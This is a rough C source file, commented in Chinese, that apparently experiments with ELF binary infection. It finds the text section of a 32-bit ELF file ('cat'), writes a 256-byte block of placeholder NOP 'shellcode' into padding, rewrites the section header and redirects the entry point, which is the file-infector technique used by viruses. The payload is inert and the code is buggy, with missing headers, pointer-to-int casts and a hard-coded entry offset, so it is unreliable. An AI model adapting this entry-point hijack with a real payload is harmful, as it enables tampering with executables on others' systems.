#include "stdio.h"
int is_ELF(char *filename){
	printf("open file!@!\n");
	int fd = open(filename, O_RDWR);
	printf("fd == %d\n", fd);
	if(fd == -1){
		printf("no such file: %s\n", filename);
		return 0;
	}
	char head[4];
	read(fd, head, 0x4);
	close(fd);
	return memcmp(head, "\x7f\x45\x4c\x46", 4) == 0;

}
void inject(filename){

	char shellcode[0x100];
	int i;
	for(i = 0; i < sizeof(shellcode); i++) shellcode[i] = 0x90; //nop
	int fd = open(filename, O_RDWR);
	if(fd < 0) return printf("open error!\n");
	char buffer[0x3000];
	read(fd, buffer, 0x3000);
	
	//保存程序原先的入口地址
	int start;
	memcpy(&start, buffer+24, 4);
	printf("start_addr at : %d\n", start);
	
		
	//寻找代码段
	int s_off;
	memcpy(&s_off, buffer+32, 4);
	//每个段描述符的长度是40个字节
	//text一般是第二个段
	printf("seg_off in file: %d\n", s_off);
	int seg_text = buffer + s_off + 40;
	int sh_addr, seg_offset, seg_size;
	memcpy(&sh_addr, seg_text+12, 4); //段映射的虚拟地址
	memcpy(&seg_offset, seg_text+16, 4);//段在文件中的偏移
	memcpy(&seg_size, seg_text+20, 4);//段的长度
	printf("seg_offset == %d\nseg_size == %d\n", seg_offset, seg_size);
	int code_start = start - sh_addr + seg_offset;//代码在文件中的起始地址
	printf("code_start == %d\n", code_start);
	for(i = 0; i < sizeof(shellcode); i++){
		if(*(buffer + seg_offset - i -1) != 0) break;
	}
	if(i != sizeof(shellcode)) return printf("cannot inject!\n");
	printf("inject is ok!\n");
	memcpy(buffer+seg_offset-sizeof(shellcode), shellcode, sizeof(shellcode));
	//printf("shllcode: %s\n", shellcode);
	//write(1, buffer+seg_offset-sizeof(shellcode), 0x100);
	printf("inject offset == %d\n", seg_offset-sizeof(shellcode));
	
	//new_seg_start 就是新代码段在文件中的偏移，也是新的程序入口点
	int new_seg_start = 0x0f00;//seg_offset - sizeof(shellcode);

	//改写text段表	
	seg_offset -= sizeof(shellcode);
	seg_size += sizeof(shellcode);
	sh_addr = seg_offset - sizeof(shellcode);
	memcpy(seg_text+12, &sh_addr, 4);
	memcpy(seg_text+16, &seg_offset, 4);
	memcpy(seg_text+20, &seg_size, 4);
	
	//修改程序入口地址
//	printf("@@@@@@@@@@@  %d\n", *(buffer+20));
	printf("@@@@@@@@@@@  %d\n", *(int *)(buffer+24));
//	printf("@@@@@@@@@@@  %d\n", *(buffer+28));
//	printf("@@@@@@@@@@@  %d\n", *(buffer+32));
	memcpy(buffer+24, &new_seg_start, 4);
//	printf("@@@@@@@@@@@  %d\n", *(buffer+24));
	printf("@@@@@@@@@@@  %d\n", *(int *)(buffer+24));
	printf("new_seg_start == %d\n", new_seg_start);

	close(fd);
	fd = open(filename, O_RDWR);
	int len = write(fd, buffer, sizeof(buffer));
	printf("inject length == %d\n", len);
	close(fd);

	char test[0x1000];
	int fd2 = open("cat", O_RDWR);
	read(fd2, test, 0x1000);
	printf("%d\n", *(int *)(test+24));
	printf("%s\n", test+0xf00);
	close(fd2);


}

int main(){
	inject("cat");	
	

}
